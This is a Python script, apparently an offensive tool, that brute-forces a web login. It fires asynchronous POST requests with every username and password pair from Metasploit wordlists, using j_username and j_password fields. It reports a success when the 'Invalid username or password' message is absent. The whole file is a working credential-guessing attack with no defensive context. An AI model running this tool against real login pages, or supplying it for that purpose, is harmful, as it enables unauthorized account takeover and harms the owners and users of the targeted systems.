#! /bin/python3

from requests import Request, get, post, PreparedRequest
from requests.sessions import Session
import click
from pathlib import Path
import sys
import asyncio
import aiohttp
from aiohttp.client import ClientSession
import asyncio
from functools import wraps
import logging
import timeit
import psutil
from typing import Generator

logger = logging.getLogger(logging.basicConfig(level=logging.INFO))

MEM_USAGE = 0.8
MEMORY = psutil.virtual_memory().free * MEM_USAGE
logger.info("Using %s of free memory (%s bytes)", MEM_USAGE, MEMORY)


def coroutine(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        return asyncio.run(f(*args, **kwargs), debug=True)

    return wrapper

@click.command()
@click.argument("url", type=str, required=True)
@click.option("-u", "user_list", type=Path, default="/usr/share/wordlists/metasploit/common_roots.txt")
@click.option("-p", "password_list", type=Path, default=Path("/usr/share/wordlists/metasploit/common_roots.txt"))
@click.option("-t", "threads", type=int, default=8)
@coroutine
async def crack(url:str, user_list:Path, password_list:Path, threads:int):
    myconn = aiohttp.TCPConnector()
    async with ClientSession(connector=myconn) as session:
        async for batch in batched_tasks((asyncio.ensure_future(post_and_check(url, data, session)) for data in permutations(user_list, password_list)), MEMORY):
            results = await asyncio.gather(*batch, return_exceptions=True)
            for result in results:
                if isinstance(result, Exception):
                    raise result
                if result:
                    sys.exit(0)

async def batched_tasks(genexpr:Generator, memory):
    batch = []
    try:
        probe_element = next(genexpr)
    except StopIteration:
        yield batch
        return
    batch = [probe_element]
    batch_size = int(memory / sys.getsizeof(probe_element))
    logger.info("Using batch size of %s", batch_size)
    while True:
        for _ in range(batch_size):
            try:
                batch.append(next(genexpr))
            except StopIteration:
                yield batch
                return
        yield batch
        batch = []
    

def permutations(user_list, password_list):
    users = user_list.read_text("latin-1").splitlines()
    passwords = password_list.read_text("latin-1").splitlines()
    for user in users:
        for password in passwords:
            yield {"j_username":user,"j_password": password, "Submit":"Sign+in"}
           

async def post_and_check(url, data, session:ClientSession) -> bool:
    async with session.post(url, data=data) as response:
        result = await response.text()
        if "Invalid username or password" not in result:
            print(f"Successful login for {data}")
            return True
        return False
    

if __name__ == "__main__":
    start = timeit.default_timer()
    crack()
    end = timeit.default_timer()
    print(f"{end-start} seconds")